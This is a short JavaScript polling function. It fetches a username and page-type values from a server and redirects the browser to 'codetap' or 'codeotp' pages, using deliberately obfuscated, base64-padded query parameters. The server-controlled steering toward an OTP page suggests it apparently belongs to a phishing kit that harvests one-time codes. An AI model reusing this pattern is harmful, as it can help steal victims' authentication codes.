function checkForUpdates() {
    // Perform an AJAX request to your server to check for updates
    fetch('/codeload/fetch')
      .then(response => response.json())
      .then(data => {

        var code = data.results;
        var user = code[0].username;
        var a = code[0].pagetype;
        var num =  parseInt(a, 10); 
        var b = code[0].mobiletype;

        console.log(user,a,b);
             
       //FOR TAP URL CREATE
        var string = 'dfgfdjkgfgdfkgk/'+user+'/'+a+'/'+b+'/bdfdgftqwefFGTW437567jbwfBSH346';
        var encodedstring = btoa(string);
        var urlc = 'codetap';
       
        const newurltap = ''+urlc+'?NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj='+encodedstring;

     // FOR CODE URL CREATE

        var nstring = 'dfgdfgdfgfdgfdfg/'+user+'/bdfdgftqwefFGTW437567jbwfBSH346';
        var encodenstring = btoa(nstring);
        var urlot = 'codeotp';
        
        const otpurl = ''+urlot+'?NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj='+encodenstring;

             
        if (a === b) {
           checkForUpdates();
          }

          if (Number.isInteger(num) && num > 0) {
            // Execute this block of code if 'a' is an integer greater than zero
            window.location.href = newurltap;
        
            }
            if (a.match(/[a-zA-Z]/)) {

                window.location.href = otpurl;

         }

   
      })
      .catch(error => {
        console.error('Error checking for updates:', error);
      });
  }

